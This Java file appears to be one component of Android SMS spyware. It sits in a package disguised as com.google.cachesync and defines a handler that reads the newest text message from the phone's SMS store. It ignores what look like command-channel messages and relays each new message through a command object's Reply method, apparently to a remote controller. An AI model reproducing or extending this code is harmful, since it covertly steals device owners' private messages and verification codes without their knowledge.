package com.google.cachesync;

import com.code4bones.utils.NetLog;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telephony.gsm.SmsMessage;


final class handleSmsLog extends Handler {

	private Context mContext;
	long lastOccured;
	
	public handleSmsLog(Context context) {
		mContext = context;
		lastOccured = -1;
	}
	
	public void handleMessage(Message msg) {
		CommandObj cmd = (CommandObj) msg.obj;
       
		//TODO: add "select" with max(date)
		Cursor cur = mContext.getContentResolver().query(Uri.parse("content://sms/"), null,null, null, "date DESC");
       if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("SMS Cursor null");
    	   return;
       }
       
       SmsObj sms = new SmsObj(cur);
       
       // skip command and reply messages
       if ( CommandObj.isServiceMessage(sms.message) )
    	   return;
       
       // skip old messages 
       if (sms.occured <=  lastOccured )
    	   return;
       
		lastOccured = sms.occured;
		
		try {
				cmd.Reply(sms);
			} catch (Exception e) {
				NetLog.v("handleSmsLog error: %s",e.getMessage());
				//cmd.replySMS("E: %s -> %s", cmd.commandName,e.getMessage());
		}
	} // handleMessage
}
